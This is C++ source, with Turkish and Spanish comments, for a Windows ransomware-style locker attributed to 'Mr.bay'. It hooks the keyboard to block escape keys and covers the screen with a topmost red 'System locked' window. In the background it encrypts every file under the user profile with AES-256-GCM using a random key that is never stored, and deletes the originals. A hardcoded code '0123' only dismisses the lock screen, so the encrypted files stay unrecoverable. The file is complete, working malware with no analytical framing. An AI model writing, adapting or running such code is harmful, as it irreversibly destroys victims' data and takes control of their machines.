#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <thread>
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

// --- GLOBAL DEĞİŞKENLER ---
HHOOK hHook = NULL;
std::string inputBuffer = "";
const std::string SECRET_PASS = "0123";

// --- ŞİFRELEME MOTORU (OPENSSL) ---
void cifrar_archivo(const fs::path& ruta_entrada, const std::vector<unsigned char>& llave) {
    try {
        fs::path ruta_salida = ruta_entrada;
        ruta_salida += ".9213912938129381824712984";

        unsigned char iv[12];
        RAND_bytes(iv, sizeof(iv));

        std::ifstream archivo_in(ruta_entrada, std::ios::binary);
        std::ofstream archivo_out(ruta_salida, std::ios::binary);

        if (!archivo_in || !archivo_out) return;

        archivo_out.write(reinterpret_cast<char*>(iv), sizeof(iv));

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, llave.data(), iv);

        std::vector<char> buffer(4096);
        unsigned char ciphertext[4096 + 16];
        int len;

        while (archivo_in.read(buffer.data(), buffer.size()) || archivo_in.gcount() > 0) {
            EVP_EncryptUpdate(ctx, ciphertext, &len, reinterpret_cast<unsigned char*>(buffer.data()), (int)archivo_in.gcount());
            archivo_out.write(reinterpret_cast<char*>(ciphertext), len);
        }

        EVP_EncryptFinal_ex(ctx, ciphertext, &len);
        archivo_out.write(reinterpret_cast<char*>(ciphertext), len);

        unsigned char tag[16];
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
        archivo_out.write(reinterpret_cast<char*>(tag), 16);

        EVP_CIPHER_CTX_free(ctx);
        archivo_in.close();
        archivo_out.close();

        fs::remove(ruta_entrada);
    } catch (...) {}
}

void GörevCalistir() {
    char* userProfile = getenv("USERPROFILE");
    if (!userProfile) return;

    std::vector<unsigned char> llave(32);
    RAND_bytes(llave.data(), llave.size());

    try {
        if (fs::exists(userProfile) && fs::is_directory(userProfile)) {
            for (const auto& entrada : fs::recursive_directory_iterator(userProfile)) {
                if (fs::is_regular_file(entrada.path())) {
                    if (entrada.path().extension() != ".9213912938129381824712984") {
                        cifrar_archivo(entrada.path(), llave);
                    }
                }
            }
        }
    } catch (...) {}
}

// --- KLAVYE ENGELLEME MODÜLÜ ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        char key = (char)p->vkCode;
        if (key >= '0' && key <= '9') {
            inputBuffer += key;
            if (inputBuffer.length() > SECRET_PASS.length()) inputBuffer.erase(0, 1);
            if (inputBuffer == SECRET_PASS) PostQuitMessage(0); 
        }
        bool alt = (p->flags & LLKHF_ALTDOWN) || (GetAsyncKeyState(VK_MENU) & 0x8000);
        bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_ESCAPE || 
            p->vkCode == VK_TAB || (alt && p->vkCode == VK_F4) || (ctrl && p->vkCode == VK_ESCAPE)) {
            return 1;
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// --- PENCERE YÖNETİMİ ---
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE:
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
        std::thread(GörevCalistir).detach(); // Şifrelemeyi arka planda başlat
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect; GetClientRect(hwnd, &rect);

        HBRUSH brush = CreateSolidBrush(RGB(220, 0, 0));
        FillRect(hdc, &rect, brush); DeleteObject(brush);

        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 255, 255));

        // 1. Kilit Sembolü
        HFONT hFontLock = CreateFontW(200, 0, 0, 0, FW_BOLD, 0, 0, 0, 0, 0, 0, 0, 0, L"Segoe UI Symbol");
        SelectObject(hdc, hFontLock);
        RECT lockRect = rect; lockRect.bottom -= 200;
        DrawTextW(hdc, L"\xD83D\xDD12", -1, &lockRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE); 
        DeleteObject(hFontLock);

        // 2. Ana Uyarı
        HFONT hFontMain = CreateFontA(60, 0, 0, 0, FW_BOLD, 0, 0, 0, 0, 0, 0, 0, 0, "Arial");
        SelectObject(hdc, hFontMain);
        RECT mainRect = rect; mainRect.top += 250;
        DrawTextA(hdc, "System locked", -1, &mainRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(hFontMain);

        // 3. Alt Metin (Mr.bay)
        HFONT hFontSub = CreateFontA(24, 0, 0, 0, FW_NORMAL, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas");
        SelectObject(hdc, hFontSub);
        RECT subRect = rect; subRect.top = rect.bottom - 150;
        DrawTextA(hdc, "The by Mr.bay", -1, &subRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
        DeleteObject(hFontSub);

        EndPaint(hwnd, &ps);
        break;
    }
    case WM_DESTROY:
        if (hHook) UnhookWindowsHookEx(hHook);
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    const char CLASS_NAME[] = "RedBlocker";
    WNDCLASS wc = {}; wc.lpfnWndProc = WindowProc; wc.hInstance = hInstance; wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_NO); RegisterClass(&wc);

    HWND hwnd = CreateWindowExA(WS_EX_TOPMOST, CLASS_NAME, "Locked", WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInstance, NULL);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
